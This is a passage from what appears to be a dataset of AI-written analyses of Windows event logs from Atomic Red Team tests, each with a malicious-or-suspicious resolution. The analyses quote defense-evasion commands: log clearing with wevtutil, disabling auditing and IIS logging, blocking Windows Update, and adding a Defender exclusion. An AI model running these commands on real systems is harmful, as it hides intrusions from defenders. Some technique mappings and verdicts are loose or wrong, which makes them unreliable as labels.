   - The use of `wevtutil.exe` for clearing logs (command lines include ""cl System"", ""cl Security"", and ""cl Windows PowerShell"") by ""admin_test"" with high integrity level indicates deliberate log tampering. This is further confirmed by multiple Sysmon Event ID 1 entries showing the execution of `wevtutil.exe` with the specific command line arguments for clearing logs.

3. **Registry Modification**:
   - Execution of `cmd.exe` with a command that modifies the Windows Update policy in the registry (`reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 1 /f`). This command is used to prevent the system from connecting to Windows Update locations. Unauthorized registry modifications, especially to enforce system policy changes, can indicate malicious intent or preparation for further compromise.

4. **Time Change Events**:
   - There are events showing system time adjustments (Event ID 4616). While not inherently suspicious, combined with other activity, it may suggest an attempt to disrupt timestamp consistency across logs to confuse forensic analysis.

**Conclusion**:
The observed activities, including log clearing, registry modification, and command execution patterns, are highly indicative of malicious behavior. The events suggest an attempt to obscure activity on the system and modify system configurations in potentially harmful ways.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Conduct a comprehensive incident response to assess the full scope and potential impact of the compromise.
- Collect additional forensic data, such as memory dumps and file system images, for further analysis.
- Review user activity for ""admin_test"" and verify the legitimacy of this account.
- Check for additional unauthorized registry changes or configuration modifications.
- Based on the investigation findings, consider resetting passwords, and implementing further security controls such as enhanced logging and monitoring to prevent future incidents.
- Report the incident to appropriate authorities and follow any regulatory requirements related to the breach."
File Extension Masquerading,"## Detailed Analysis of Provided Windows Event Logs:

Upon analysis, there are several events that suggest highly suspicious and potentially malicious activity occurring on the host, *Server002*.

1. **Event Logs Being Cleared:**
   - **Security Log EventID 1102** and **System Log EventID 104** indicate the security and system logs have been cleared. The user ""admin_test"" initiated these actions using the command-line utility `wevtutil.exe`, as seen in the **Sysmon logs**. This is often indicative of an attempt to cover tracks, a common tactic in malicious activities.

2. **Suspicious PowerShell Execution:**
   - Multiple **PowerShell executions (Windows PowerShell logs and Sysmon logs)** loading scripts from the `Temp` directory show various attempts at script execution: `T1036.003_masquerading.doc.ps1`, `T1036.003_masquerading.pdf.ps1`, and `T1036.003_masquerading.rtf.ps1`.
   - The naming convention ""T1036.003_masquerading"" aligns with MITRE ATT&CK Technique T1036.003 [Masquerading: Masquerade Task or Service]. This correlates with using legitimate tools or tasks to hide malicious actions.

3. **Excessive Command Line Usage:**
   - Events where processes like `cmd.exe` are running excessive command-line operations to copy and execute files with misleading extensions, like `.docx.exe`, `.pdf.exe`, etc. This behavior is characteristic of the masquerading technique used to mislead detection tools and users.

4. **Multiple Failed Credential Access Events:**
   - **Security Log EventID 5379** shows repeated attempts to access credentials without success. The repeated failed attempts may indicate reconnaissance or brute force attempts by an unauthorized user or script.

5. **Privilege Escalation:**
   - **Security Log EventID 4672** captures privileges assigned to ""NT AUTHORITY\\SYSTEM,"" indicative of a potential privilege escalation or a legitimate high privilege process being manipulated for malicious purposes.

6. **System Integrity Attempt:**
   - Events showing execution of common system utilities like `whoami.exe`, `hostname.exe`, suggest attempts to gather information about the system environment, a typical early-stage virus infection pattern.

## Assessment and Resolution:
Given the evidence presented, it is clear that the logs contain indicators of unauthorized and potentially harmful actions, where system utilities and PowerShell are misused to execute scripts from non-standard directories, with an attempt to clear logs to erase traces. The analysis strongly suggests malicious intent.

**Resolution: MALICIOUS**

### Guidance:
1. **Immediate Actions:**
   - Isolate the affected machine, *Server002*, from the network to prevent further unauthorized activities.
   - Conduct a thorough investigation on the user account ""admin_test"", possibly compromise or misuse.
   - Analyze the found scripts (`T1036.003_masquerading.*.ps1`) for malicious payloads or behaviors.

2. **Follow-up Actions:**
   - Change all credentials associated with compromised/suspected accounts.
   - Restore the system from a known good backup if possible.
   - Implement enhanced monitoring and logging to detect similar activities in the future.
   - Review and update security policies and user permissions.

Ensure all team members are informed of the incident and adhere to organizational security protocols to prevent future occurrences."
Register Portable Virtualbox,"Based on the provided logs from a Windows machine, the following observations and analysis have been conducted:

1. **Use of Windows Tools**: 
   - Tools like `wevtutil.exe`, `conhost.exe`, `sc.exe`, `whoami.exe`, and `hostname.exe` were used. These are legitimate Windows utilities but can be abused by attackers. 
   - `wevtutil.exe` clearing logs and `sc.exe` being used to manage services can be associated with malicious activity, especially when used in combination with suspicious command-line arguments.

2. **Log Cleared Events**:
   - Event ID `1102` in the Security log and Event ID `104` in the System log indicate that the logs have been cleared. This is often found in scenarios where attackers try to cover their tracks.

3. **PowerShell Activity**:
   - The PowerShell log shows a script being executed to download a file from GitHub associated with Atomic Red Team, a library of tests designed to test the capabilities of security tools, which is indicative of penetration testing or simulation of malicious activity. This type of activity is typically observed during red team engagements or testing scenarios.

4. **Security Log Events and Privileges**:
   - Event ID `4672` indicates that an account with special privileges logged on. While this can be normal if done by a legitimate admin account, it can also indicate privilege escalation attempts if conducted by an attacker.
   - Event ID `4624` shows a successful logon using a service account (`NT AUTHORITY\\SYSTEM`).

5. **Command Execution**:
   - The `cmd.exe` execution with multiple resource creation and service operations (creating and starting VBoxDRV) shows heavy use of command line operations possibly for configuring a service or application like VirtualBox, which might be used to run VMs. 

6. **Indicators of Interaction Simulation**:
   - Process activity from `RUXIMICS.exe`, which is part of the Microsoft User Interaction management suite, shows typical system interaction. The patterns of usage seem routine for interaction managers or system background services.

Considering all the above observations:

- **Log tampering and indicator obfuscation** were observed due to the clearing of logs, typically a red flag for hiding malicious activity.
- **Execution of potentially suspicious scripts via PowerShell** and the use of `rundll32.exe` operations suggest actions beyond typical routine administration.
- The presence of Atomic Red Team activity indicates this might have been a legitimate simulation like a security assessment; however, without confirmation, the activity itself could mimic an attacker's behavior.

Given these mixed indicators of both security testing and potentially malicious behavior without absolute confirmation of the nature (benign or part of a legitimate security exercise), the situation is assessed as:

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Further investigation is needed to verify the context of activities, such as contacting system owners or administrators to verify if any security assessments were planned.
- Review additional logs (if available) for corroborative evidence to confirm or deny benign testing.
- Ensure known safe IPs and sources for such activities, further analyzing unexpected or unplanned activities.
- Implement or confirm existing alert mechanisms for critical file and log modifications."
Impair Windows Audit Log Policy,"Upon analyzing the Windows event logs provided, here is a detailed breakdown of notable activities and potential indicators of malicious behavior:

### Suspicious and Anomalous Behavior
1. **Event Clearing:**
   - The logs indicate multiple instances (Event IDs 1102 and 104) of clearing the event logs for System, Windows PowerShell, and Security channels by the user `SERVER002\admin_test`. This action can mask other potentially malicious activities as it erases records of past events.

2. **Audit Polices Change:**
   - Multiple audit policy changes have been recorded (Event ID 4719) where audit settings for categories such as ""Account Logon,"" ""Logon/Logoff,"" and ""Detailed Tracking"" were disabled. This action is often a tactic to reduce the visibility of potentially suspicious activities.

3. **Command Line Activity:**
   - A `cmd.exe` process was executed with command-line arguments that modify audit policies (`auditpol /set`). Disabling audit logs using `auditpol` is a common technique used by adversaries to avoid detection.

4. **Time Change:**
   - There are recorded changes to system time (Event ID 4616). Unauthorized changes to the system time can potentially disrupt event timelines and log integrity.

5. **Unusual Use of System Utilities:**
    - The execution of `wevtutil.exe` commands for clearing logs can be considered suspicious if not performed as part of standard administrative operations.

### Assessment of the Situation
The presence of event log clearing, changes in audit policy settings, and potential tampering with system time indicates potential malicious activity or at least a compromise of security practices on the host. The actions performed are typically associated with an attempt to cover tracks or evade detection following malicious activities.

### Resolution
Based on the evidence observed in these logs:

- **Resolution: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Response:**
   - Alert the security team and isolate the host from the network to prevent any further potential compromise.
   - Preserve the current state of the host for further forensic analysis.

2. **Detailed Examination:**
   - Conduct a thorough forensic analysis of the host to investigate the extent of the compromise.
   - Review user activity for `SERVER002\admin_test` to determine if credentials were misused.
   - Analyze additional logs, memory, and file system for any backdoors or persistence mechanisms.

3. **Remediation:**
   - Reset all passwords associated with the compromised account and any other credentials potentially exposed.
   - Restore potentially affected systems to a known good state from backups, if available.

4. **Future Prevention:**
   - Implement stricter logging and monitoring policies.
   - Enhance security training for users with elevated privileges to prevent such actions or abuse.
   - Consider deploying threat detection and response solutions to identify such tactics proactively.

The logs indicate actions that are not consistent with routine administrative management and suggest active attempts to obfuscate and suppress logging, which aligns with common methods used during malicious activities."
Delete an entire folder - Windows cmd,"**Analysis of Provided Windows Event Logs:**

1. **System Log:**
   - Events with EventID 104 indicate that logs (System and Windows PowerShell) were cleared by the user `admin_test`. Log clearing can be an action taken by attackers to hide their tracks after malicious activities.

2. **Security Log:**
   - EventID 1102 indicates Security logs were cleared by the same user, `admin_test`. This is a strong indicator of potentially malicious activity, as clearing security logs is a common tactic to remove evidence of an attack or unauthorized access.

3. **Sysmon Log:**
   - There are several `wevtutil.exe` processes logged (ProcessID: 5048, 2808, 5316, 3152), which are responsible for clearing logs in the Sysmon, Application, System, and Security channels. This utility is often used legitimately but in this context—coupled with the log clearing entries—it likely indicates an attempt to cover tracks.
   - Multiple instances of `cmd.exe` with unusual command line arguments such as checking and removing temporary directories can point towards scripted or automated tasks which could be indicative of actions performed by scripts or malware.

4. **Command Execution:**
   - There is suspicious command execution that appears to revolve around creating, verifying, and deleting placeholder directories (`deleteme_T1551.004`). The naming and actions suggest tactics intended to test or manipulate something temporarily, a tactic sometimes used by malware or during lateral movement.

5. **General Observations:**
   - The logs suggest a chain of actions typically used for clearing evidence followed by checking and removing temporary files.
   - The metadata and pattern of log clearance combined with the automated scripting hints at a sophisticated user or malicious entity attempting to hide actions on the system.

**Assessment:**

Given the evidence from the log entries of clearing events across multiple channels, the pattern of named temporary files, and the use of `wevtutil.exe` for clearing those specific logs, these actions strongly suggest attempts to hide potentially malicious activity. Additionally, the user `admin_test` is repeatedly involved in these actions without other user accounts noted, indicating possible compromise of this account or malicious insider actions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the affected host (`Server002`) from the network to prevent further propagation of potential threats.
   - Reset credentials for `admin_test` and investigate possible paths of compromise for this account.
   - Review recent activities associated with `admin_test` on the network using existing security logs from other sources such as IDS/IPS, firewall logs, and network traffic flows.

2. **Further Investigation:**
   - Examine other systems for similar patterns of activity, especially systems accessed by `admin_test`.
   - Perform forensic imaging of the affected system to retain evidence for a detailed post-incident analysis.
   - Use anti-malware tools to scan the isolated system for any known threats.

3. **Preventive Measures:**
   - Implement stricter audit policies to monitor for log clearance events.
   - Ensure robust logging and event forwarding to a secure external system for better tracking of potential malicious activities.
   - Provide cybersecurity training focused on identifying potential signs of insider threats or credential compromise.

This analysis highlights a critical security breach and requires immediate and comprehensive incident response actions."
Lolbin Jsc.exe compile javascript to dll,"Based on the provided logs, let's analyze and identify any suspicious or malicious activity:

### Key Observations:

1. **Log Clearing Events**:
   - There are log clearing activities present in the logs (Event ID 104 in the System Logs and Event ID 1102 in the Security Logs). These activities were initiated by the user `admin_test`. Log clearing is often done to cover tracks, which is usually indicative of malicious intentions, especially if there is no legitimate or documented reason for such activities.

2. **Suspicious Command-Line Activity**:
   - The `wevtutil.exe` tool has been used extensively to clear the event logs, as seen in the Sysmon logs. These clear events affect various logs, including System, Security, and PowerShell, and were executed by `admin_test`. 
   - The use of `cmd.exe` with command lines related to `jsc.exe` also suggests potential scripting which is not usual for standard operations and may indicate a form of obfuscation or execution of unauthorized scripts. This is suspicious given the context of the other events.

3. **Security Audit Logs**:
   - There are multiple Event ID 4672 entries indicating that accounts with special privileges have logged on, specifically with `SeDebugPrivilege`, which is highly sensitive. 

4. **Potent Indicators of Compromise**:
   - The concise sequence of log deletions by an admin user, together with the presence of command-line operations targeting critical system utility (`wevtutil.exe`), supports the pattern of potential malicious activities.

5. **File Paths and Process Execution**:
   - In Sysmon logs, `cmd.exe` was used with specific structured commands to run scripts, which weren’t evident in benign activities. Furthermore, the execution within ""C:\Users\admin_test\Documents"" directory indicates user-space operations that typically align with targeted administrative tasks — a common tactic among adversaries to obscure cyber activities.

6. **Contextual Security Behavior**:
   - The occurrence of `whoami.exe`, `hostname.exe`, and other query-based tools execution further strengthens the hypothesis of reconnaissance or privilege enumeration, often preceding or succeeding an intrusion exploit.

### Assessment:

- **The combination of cleared event logs, suspicious use of command-line utilities like `wevtutil.exe` and `cmd.exe`, and the privilege escalation attempts with sensitive privileges strongly suggest that a potential security breach has been attempted on this host.** 

**Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Response**:
   - Isolate the system from the network to prevent any further malicious activity.
   - Conduct a thorough forensic investigation to understand the full scope of the breach.

2. **Further Investigation**:
   - Review user activity logs (if available) to gain more details about actions performed by `admin_test`.
   - Correlate with network logs to check for any data exfiltration or external communications.

3. **Hardening Measures**:
   - Reinstate logging and set up alarms for any future log clearing events.
   - Restrict and audit the use of administrative tools and command-line usage across sensitive environments.

4. **Awareness & Training**:
   - Conduct training sessions for administrators on the dangers and signs of unauthorized activities and ensure compliance with security policies.

5. **Enhanced Monitoring**:
   - Utilize behavioral monitoring tools to detect unusual activities.
   - Ensure that all systems have updated security patches to mitigate exploit attempts. 

By taking these steps, future incidences can be minimized, and the organization's security posture can be enhanced."
Windows Auto Update Option to Notify before download,"After thoroughly analyzing the provided Windows event logs, several patterns and events stand out that potentially indicate suspicious or malicious activity:

1. **Log Clearing Events**: 
   - The logs contain multiple events where Windows event logs such as Security (EventID 1102), System (EventID 104), and Windows PowerShell logs have been cleared. The clearing of logs, especially Security logs through `wevtutil.exe`, is a common tactic used by attackers to cover their tracks post-compromise. Specifically, the execution of `wevtutil.exe` by the user `admin_test` to clear logs is highly suspicious.

2. **Privilege Action Events**: 
   - There are multiple instances of EventID 4672 indicating special privileges granted to `admin_test`. These privileges include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, which are sensitive and could allow an attacker to escalate privileges or manipulate system components.

3. **Command Line Usage with System Tools**:
   - The use of `cmd.exe` to run a command that modifies the Windows Registry (`reg.exe`) to alter Windows Update settings (using a command involving `HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU`) is an uncommon and potentially malicious action, indicating possible system configuration tampering.

4. **Unusual Process Execution**:
   - There are Sysmon events involving the `wevtutil.exe` and `conhost.exe` binaries with command lines that typically would not be executed manually by an administrator through such a direct method (e.g., clearing logs).

5. **Local Time Change**:
   - Time change events in the security and system logs may indicate attempts to manipulate timestamps to confuse forensic interpretations.

6. **Consistent Pattern of Execution**:
   - The pattern of executing system utilities in quick succession, including `wevtutil.exe` for clearing multiple types of logs, suggests automated or scripted activity typical of a post-exploitation cleanup process.

Based on these observations, the activities documented in the logs correspond to known behaviors related to post-exploitation or compromise, including clearing logs to hide activities, using administrative privileges to alter system configurations, and suspicious command execution patterns.

### Conclusion: MALICIOUS

The collected events, viewed collectively, strongly suggest the presence of unauthorized and malicious actions on the host, likely post-exploitation activities. These are designed to obfuscate the attack and potentially prepare for future malicious actions. Immediate actions should be taken to:

- Isolate the affected system from the network.
- Conduct a full forensic investigation on the host.
- Validate and possibly reset credentials associated with `admin_test`.
- Review internal systems for other signs of breach or lateral movement.
- Implement improved logging and monitoring to detect similar activities in the future."
Tamper with Windows Defender Evade Scanning -Process,"Upon reviewing the provided Windows event logs, the following observations and analysis are made regarding potential suspicious or malicious activities:

1. **Event Log Clearing**:
   - Multiple instances of event log clearing are noted, highlighted by Event ID 104 in the System log and Event ID 1102 in the Security log. Logs from channels such as ""System"", ""Windows PowerShell"", and ""Security"" are cleared by a user with the username ""admin_test"". This activity is often associated with attempts to cover tracks by malicious actors.

2. **Process Execution**:
   - **Use of `wevtutil.exe`**: Observed in the Sysmon log where the `wevtutil.exe` process is executed multiple times to clear various logs (e.g., System, Application, Security). This tool is a Windows native utility commonly used for clearing event logs and its repeated use in this manner is suspicious.
   - **PowerShell Activity**: An event shows a PowerShell script running with the command to add an exclusion for ""outlook.exe"" in the Windows Defender preferences. This could be indicative of an attempt to tamper with the system’s antivirus/anti-malware settings to exclude a potentially malicious process.

3. **Timing and Correlation of Events**:
   - The suspicious activities, including the clearing of logs and modifying Windows Defender settings via PowerShell, occur in a very close timeframe. This synchronization suggests an orchestrated attempt to obfuscate potentially malicious activities and ensure persistence.

4. **Behavioral Concerns**:
   - The actions undertaken by the user ""admin_test"" demonstrate behaviors that typically align with malicious intent, including tampering with security logs and system settings.
   - Although multiple instances of Microsoft Edge update activities are logged, they appear to align with routine update activities and follow normal system processes, thus they are not directly flagged as suspicious in this context.

### Assessment:

Based on the evidence from the event logs, the activities noted do not align with typical benign administrative actions. The combination of log clearing actions and PowerShell script execution intended to alter antivirus behavior strongly indicates suspicious behavior. Such activities warrant further investigation to confirm their intent and impact.

### Resolution:

- **SUSPICIOUS**: The logs reflect activities that are highly suspicious, potentially indicative of malicious behavior. It is recommended to conduct a more thorough investigation, including but not limited to:
  - Verification of the legitimacy of user ""admin_test"" and their administrative activities.
  - Review of the system for any signs of compromise or undetected malicious processes.
  - Implementation of additional monitoring to capture future activity and prevent potential security breaches. 

The evidence should be preserved and analyzed in conjunction with other threat intelligence and system data to determine the full scope of activities and associated risks."
Indirect Command Execution - Scriptrunner.exe,"### Detailed Analysis of the Logs:

1. **Sysmon Logs:**
   - **Event ID 1 (Process Creation):** There are multiple instances of `wevtutil.exe` invoked to clear various event logs like Sysmon/Operational, Application, System, Security, and Windows PowerShell. `wevtutil.exe` is a legitimate Windows tool but is often used by attackers to cover their tracks by clearing the event logs.
   - **Event ID 5 (Process Termination):** The corresponding termination events for processes initiated earlier show regular activity completion.
   - **Command Execution:** 
     - The execution of `powershell.exe` along with a command involving `Scriptrunner.exe` and `calc.exe` is logged. While `calc.exe` (Calculator) execution per se is benign, its execution via script manipulation could be suggestive of an attempt to test payloads or scripts.
   
2. **Application Logs:**
   - Logs show stopping of services, particularly related to the EdgeUpdate, which is not inherently malicious but could be related to updating procedures or controlled terminations for maintenance.

3. **System Logs:**
   - **Event ID 104 (Log Cleared):** Logs indicate that the event logs for System and Windows PowerShell were cleared, which is typically suspicious as it might be indicative of someone trying to remove traces of their actions.
   - **Event ID 35 (Time Source Chosen):** Normal activity related to time synchronization.

4. **Security Logs:**
   - **Event ID 1102 (Security Log Cleared):** The clearing of the Security event log is a strong indicator of potential malicious activity, as attackers frequently do this after accessing a system to erase evidential trails.
   - **Event ID 4616 (System Time Changed):** Time changes could be legitimate due to synchronization but should be examined in a broader context, especially following log clearance.

5. **Windows PowerShell Logs:**
   - PowerShell invocation with a script and the included command suggest an automated or scripted task execution. Repeated start and stop of session logs indicate a structured script flow.

### Assessment:

The review of these logs depicts behavior commonly associated with illicit activity, particularly due to the repeated clearing of logs across multiple channels (`Security`, `System`, and `Windows PowerShell`) and the use of utilities like `wevtutil.exe` by a user account (`admin_test`), indicating potential log manipulation. The use of PowerShell to execute secondary applications is a common trait in scripts executing exploits or tests.

### Identified Risks:
- Unauthorized log clearing suggests an attempt to obfuscate actions, pointing to potential unauthorized access or post-exploitation cleanup.
- Scripted execution and process creation in the PowerShell logs also pose a risk, signaling possible automation of a malicious payload.

### Guidance on How to Proceed:

1. **Resolution: MALICIOUS** - The presence of multiple logs being cleared, especially security logs, with the execution of PowerShell scripts and tool usage aligning with known malicious tactics necessitates considering this activity as malicious.
2. **Immediate Actions:**
   - Investigate the `admin_test` account for unauthorized access.
   - Conduct a thorough review of security patches and configurations on the host.
   - Ensure integrity checks of critical files and systems.
   - Strengthen monitoring of audit logs for similar activities across the network.
   - Share indicators of compromise (IOC) with a security team to bolster preventive controls.

3. **Remediation:**
   - Consider implementing stronger auditing in event logs with safeguards against unauthorized clearing.
   - Deploy advanced threat detection and anomaly detection tools to identify and block possible attacks."
Creating W32Time similar named service using schtasks,"After analyzing the provided Windows event logs, I have identified several activities that indicate potential malicious behavior:

1. **Log Clearing Activities**:
   - **Security Log Cleared**: Event ID 1102 in the Security log indicates that the security event log was cleared by the user `admin_test`. Clearing of logs is often a significant indicator of suspicious activity because it can be an attempt to cover tracks.
   - **System and PowerShell Logs Cleared**: Event ID 104 in the System log indicates that both the System and Windows PowerShell logs were cleared. This action performed by the same user (`admin_test`) further reinforces the suspicion as clearing logs is not typical during normal operations and suggests an attempt to hide actions.

2. **Scheduled Task Creation**:
   - A suspicious command was executed using `cmd.exe` that creates a scheduled task named `win32times`. The task is configured to run a non-existing PowerShell script with the execution policy set to bypass, which is often used to circumvent prevention measures and execute unauthorized scripts. The PowerShell script reference (T1036.004_NonExistingScript.ps1) indicates a tactic often aligned with masquerading.

3. **Processes Indicative of Reconnaissance and Lateral Movement**:
   - The use of `whoami.exe` and `hostname.exe` suggests attempts to gather information about the current user and system environment, which are typical reconnaissance steps in attack scenarios.

4. **Continuous Use of `wevtutil.exe`**:
   - This tool is used to query and clear event logs when operated with elevated privileges. Multiple executions of `wevtutil.exe` to clear different event logs (e.g., Application, Security) were observed, which supports the pattern of activity aimed at covering tracks.

Based on these observations, the activities captured in the event logs display strong indicators of deliberate and potentially unauthorized actions to conceal operations, impersonate legitimate processes, and execute them with elevated privileges.

**Resolution: MALICIOUS**

### Recommended Actions:
1. **Immediate Containment**:
   - Disconnect the affected machine, `Server002`, from the network to prevent further unauthorized activity.
   
2. **Detailed Forensic Analysis**:
   - Conduct a full forensic analysis of the host to identify all processes and files related to the suspicious activities.
   - Verify if there are any other backdoors or persistence mechanisms installed on the system.

3. **Review and Strengthen Security Controls**:
   - Ensure logging cannot be easily cleared without triggering alerts.
   - Implement stricter policies and monitoring around the use of administrative tools like `wevtutil.exe`.

4. **User Access Reviews and Permissions**:
   - Review permissions and access rights for `admin_test` and other accounts with administrative privileges.
   - Rotate credentials and consider implementing multi-factor authentication.

5. **Security Awareness and Training**:
   - Conduct training to ensure employees recognize the risks associated with unauthorized administrative actions and suspicious command executions.

6. **Implementing Detection Mechanisms**:
   - Set up alerts for log clearing and unauthorized use of admin utilities.
   - Use regular integrity checks on critical system files and system state.

These actions should be taken urgently to mitigate the risk and ensure that the integrity of the system and its data is maintained."
Abusing MyComputer Disk Fragmentation Path for Persistence,"### Detailed Analysis of Logs

#### Overview

The log entries provided contain various Windows event logs, mainly focusing on **Sysmon**, **System**, **Application**, and **Security** logs. These logs exhibit system events, process creations, command-line executions, and security audit events. Here is a detailed analysis of each log component and determination of potential malicious activities.

#### Sysmon Logs Analysis

1. **Process Activity:** 
   - Regular use of `wevtutil.exe` is observed, which is a legitimate Windows utility used for managing event logs (Event Records 17951, 17955, 17959, etc). However, clearing certain logs can be considered suspicious, especially if done frequently or unexpectedly.
   - Execution of `cmd.exe` with `reg add` command suggests an alteration of registry settings to potentially change system behavior (Event Record 17979). This could indicate an attempt to persist a program or conduct unauthorized changes.

2. **Console Hosts:**
   - Frequent spawning of `conhost.exe` is expected when command-line interfaces or related processes like `wevtutil.exe` and `cmd.exe` are used. 
   
3. **Unusual Registry Key Alteration:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\...` stands out because it modifies a registry setting related to the defragmentation path, setting it to `notepad.exe` (Event Record 17979, 17981). This is highly unusual and potentially malicious if it aims to execute a non-defrag application using system calls intended for defragment operations.

#### System Logs Analysis

- Events indicating the clearing of logs from channels like **System** and **PowerShell** by the user `admin_test` are red flags for covering tracks of potentially unwanted operations.
  
#### Security Logs Analysis

- **Clearing Security Logs:** The log event where the Security log was cleared is very suspicious (Event Record 30350). Log clearing may be an attempt to hide malicious activity.
  
#### Application and EdgeUpdate Logs Analysis

- **EdgeUpdate:** Multiple instances of `MicrosoftEdgeUpdate.exe` being executed could either be routine updates or misuse if user `admin_test` isn't responsible for starting these updates. However, without further context, this seems benign given no explicit indicators of compromise.

#### Conclusion

Here, we see consistent and unusual behavior involving the manipulation of event logs (clearing) and registry settings, particularly with an irregular registry modification using `reg.exe` and `cmd.exe` which are consistent tools of attack techniques for persistence or evasion.

### Resolution

- **Resolution: MALICIOUS**

The confluence of pervasive use of administrative tools to clear logs, modify registries in suspicious manners, and execute unexpected commands under a high-integrity user profile suggests deliberate actions to hide potentially malicious activities. 

### Guidance

- Conduct further investigation into the user `admin_test` activities, potentially interviewing the involved party for more context.
- Escalate this investigation, focusing on network activity from the host, and whether similar activities have been observed across other systems.
- Review endpoint security measures, particularly concerning user privilege management and system integrity checks.
- Consider using additional security solutions to audit registry changes and flag unauthorized log modifications actively."
Execute base64-encoded PowerShell,"The provided logs exhibit several signs of activity indicative of potential malicious behavior. I will summarize the key suspicious activities:

1. **Event Log Clearing**:
   - The logs from the `System` and `Security` channels were both cleared by the user ""admin_test"" (Security Log Event ID 1102 and System Log Event ID 104). This is a common tactic used by attackers to cover their tracks post-exploitation.

2. **Use of `wevtutil.exe`**:
   - The `wevtutil.exe` is used multiple times by the user ""admin_test"" to clear event logs from various channels, such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Windows PowerShell"". These actions are consistent with log-clearing activity.

3. **Suspicious PowerShell Activity**:
   - PowerShell scripts executed with the '-EncodedCommand' flag (Sysmon Event ID 1 and PowerShell Event ID 600), which is often used in obfuscation techniques to evade detection. The encoded command in the script for ""Write-Host 'Hey, Atomic!'"" itself isn't malicious, but its means of execution is suspicious in the context of the other logs.
   - The use of base64 encoding to execute PowerShell commands is indicative of potentially malicious behavior, as it's a common tactic used by threat actors.

4. **High Integrity Level Process Execution**:
   - Processes such as `wevtutil.exe` and `conhost.exe` are executed at a high integrity level, which suggests privilege execution. This behavior is noteworthy when combined with log clearing and PowerShell activity.

Based on the patterns observed in the logs, the following resolution is applicable:

**Resolution: MALICIOUS**

### Guidance:
- **Immediate Response**: It's critical to secure the host immediately to prevent further unauthorized actions. Consider isolating the machine from the network.
- **Forensic Investigation**: A full investigation should be conducted to trace all actions taken by the ""admin_test"" user and determine the initial point of compromise.
- **Review Access Controls**: Review user privileges and configurations to prevent misuse by authorized users or exploitation by attackers.
- **Monitor for Indicators**: Enhance monitoring for similar activities across other systems in the environment.
- **Incident Response Plan**: Execute an incident response plan to handle the breach, mitigate damage, and recover affected systems.

This case exhibits key indicators of a potential compromise, and appropriate security measures should be taken immediately to mitigate further risk."
User scope COR_PROFILER,"After analyzing the provided Windows event logs, I can summarize the key findings and determine the nature of the activities recorded:

### Analysis:

1. **Windows PowerShell Log:**
   - A PowerShell script is executed which creates registry keys and sets properties in `HKCU:\Environment` using specific GUID paths linked to a DLL, and subsequently launches `eventvwr.msc` using `mmc.exe`.
   - This is consistent with tactics used in living-off-the-land binaries (LOLBins) attacks, where attackers abuse system tools to execute malicious payloads. The use of `eventvwr.msc` to execute payloads is a known technique to bypass security controls.

2. **System Log:**
   - The system event logs indicate multiple event log clearing activities shortly before and after the suspicious PowerShell activities. The logs show that both System and Windows PowerShell logs were cleared. This is a typical behavior of malicious actors attempting to obscure their actions and avoid detection.

3. **Security Log:**
   - The security log was also cleared, further supporting the theory that a malicious actor attempted to cover their tracks.

4. **Sysmon Log:**
   - The Sysmon logs show the execution of `wevtutil.exe` to clear logs programmatically. This is done by the same user `SERVER002\admin_test`, which correlates with other suspicious activities.
   - Additionally, activities involving the creation of registry keys, dlls, and execution of `mmc.exe` are captured here, supporting the abnormal usage observed in PowerShell logs.

### Assessment:

The logs collectively indicate activities that are consistent with an attempt to establish persistence and execute a potentially malicious DLL via a registry-based technique, which is followed by systematic wiping of event logs to cover tracks. The use of `AtomicRedTeam` tools suggests the possibility of either a red team exercise or an actual attack using publicly known techniques.

### Identified Threats/Risks:
- **Persistence Mechanism:** Creating registry-based entries pointing to potentially harmful DLLs.
- **Log Tampering:** Use of `wevtutil` to clear logs, which is a technique to evade detection and audit trails.
- **Execution of LOLBins:** Utilizing `eventvwr.msc` for arbitrary code execution, indicating possible evasions from traditional monitoring.

### Guidance and Resolution:

Given the collected logs and the behaviors noted:

- **Resolution: MALICIOUS.** The activities show clear indicators of compromise (IoC), including unauthorized registry modifications for persistence, and event log clearing actions. I'm confident these events represent malicious activity.
  
### Recommendations:
1. **Immediate Isolation:** Isolate the affected system (`Server002`) from the network to prevent further spread or data exfiltration.
2. **Forensic Analysis:** Conduct a detailed forensic analysis of the machine, focusing on recent changes in the registry, file system, and scheduled tasks.
3. **Review User Actions:** Verify the legitimacy of actions by the user `admin_test`. Ensure account credentials haven’t been compromised.
4. **Enhance Monitoring:** Deploy enhanced monitoring with anomaly detection and alerting for similar suspicious activities.
5. **Patch Management:** Ensure all software is up to date, including executing tools like PowerShell and event utilities, to mitigate against known vulnerabilities and exploits.
6. **Audit and Policy Enforcement:** Implement audit and policy enforcement to prevent unauthorized log clearing and registry changes.

These actions are necessary to contain the threat, understand the extent of the compromise, and prevent future incidents."
Disable Windows IIS HTTP Logging,"Upon reviewing the provided Windows event logs, several activities stand out that warrant closer examination due to their potential implication in malicious behavior:

1. **Use of PowerShell with Suspicious Commands:**
   - There is an execution of PowerShell with the command: `""powershell.exe"" & {C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \""Default Web Site\"" /section:httplogging /dontLog:true}`. This command attempts to modify the web server configuration to stop logging HTTP requests, which is a known tactic used by attackers to prevent their activities from being logged.

2. **Clearing of Event Logs:**
   - Security event logs show that logs were cleared (EventID 1102) by the user `admin_test`. Clearing logs can be a strong indicator of an attempt to cover tracks, a behavior commonly associated with malicious intent.

3. **Multiple Edge Update Executions:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` and related Edge Update processes running might indicate benign update operations. However, because the Edge Update processes are invoked multiple times and, combined with other suspicious activity, they could serve as a smokescreen for other activities.

4. **Commands Executed with High Integrity Level:**
   - The events show multiple executables like `HOSTNAME.EXE`, `whoami.exe`, `wevtutil.exe`, and others running at a high integrity level with the `admin_test` user. Among these, `wevtutil.exe` is used for clearing event logs and could be used for malicious purposes.

5. **Time Adjustments:**
   - The kernel logs indicate a time change (EventID 4616), which can be part of an attacker's method to alter timestamps in logs to evade detection.

